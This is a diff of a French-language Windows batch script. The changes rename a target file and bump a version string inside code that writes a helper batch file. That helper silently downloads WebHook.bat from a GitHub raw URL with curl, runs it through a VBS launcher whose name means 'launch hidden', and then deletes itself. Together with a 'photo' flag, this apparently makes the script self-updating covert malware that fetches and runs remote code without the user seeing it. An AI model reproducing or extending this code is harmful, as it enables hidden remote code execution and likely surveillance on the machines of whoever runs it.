@@ -18,11 +18,11 @@ set REPO=lunettes-octo-flottantes
 set chemin=%debutchemin%paserelle.bat
 set chemin_vbs=%debutchemin%lancer_cacheeeeee.vbs
 set URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat
-set DESTINATION=WebHook1.bat
+set DESTINATION=WebHook.bat
 
 
 
-set version=2025-01-3-17
+set version=2025-01-31T18
 
 
 set photo=true
@@ -132,9 +132,9 @@ goto :finversion
 echo @echo off > "%chemin%"
 echo setlocal enabledelayedexpansion >> "%chemin%"
 echo set "URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat" >> "%chemin%"
-echo set "DESTINATION=%debutchemin%WebHook1.bat" >> "%chemin%"
+echo set "DESTINATION=%debutchemin%WebHook.bat" >> "%chemin%"
 echo curl -o "%DESTINATION%" "%URL%" > nul 2>&1 >> "%chemin%"
-echo cscript //nologo "%debutchemin%lancerWebHook1.vbs" >> "%chemin%"
+echo cscript //nologo "%debutchemin%lancerWebHook.vbs" >> "%chemin%"
 echo del "%chemin_vbs%" >> "%chemin%"
 echo del "%chemin%" >> "%chemin%"
 
